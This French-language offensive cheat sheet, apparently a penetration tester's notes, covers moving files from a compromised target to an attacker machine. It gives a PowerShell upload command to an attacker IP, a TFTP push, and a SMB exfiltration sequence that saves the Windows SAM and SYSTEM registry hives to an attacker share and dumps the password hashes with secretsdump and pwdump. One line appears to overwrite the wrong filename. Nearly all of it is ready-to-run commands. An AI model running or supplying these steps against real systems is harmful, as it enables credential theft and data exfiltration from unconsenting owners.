## Powershell 
De la machine cible vers la machine attaquante en utilisant le fichier `upload.php`

```sh
sudo mkdir /var/www/uploads
sudo chown www-data:www-data upload
sudo php -S localhost:80
```

```php
<?php
$uploaddir = '/var/www/uploads/';
$uploadfile = $uploaddir . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile);
?>
```

```sh
(New-Object System.Net.WebClient).UploadFile('http://192.168.45.128/upload.php', 'remote_file.ext')
```


## TFTP

```sh
sudo ftpd --daemon --port 69 /var/www/uploads
```

```sh
tftp -i <attack-ip> put remote_file.ext
```


## SMB
Récupérer les fichiers contenant les hachages de mot de passe, les renvoyer à notre machine attaquante, puis vider les hachages localement:

```sh
impacket-smbserver share path -smb2support -comment 'Hacker Ber1y, Get your data'
```

```c
reg.exe save HKLM\SAM sam.bak
reg.exe save HKLM\SYSTEM system.bak
```

```c
move sam.bak \\attack-ip\share\sam.bak
move system.bak \\attack-ip\share\sam.bak
```

Ou 

```c
reg.exe save HKLM\SAM \\ATTACKING_IP\share\sam.bak
reg.exe save HKLM\SYSTEM \\ATTACKING_IP\share\system.bak
```

Dump hashs

```sh
secretsdump.py -sam sam.bak -system system.bak LOCAL
```

```
/usr/share/creddump7/pwdump.py SYSTEM SAM
```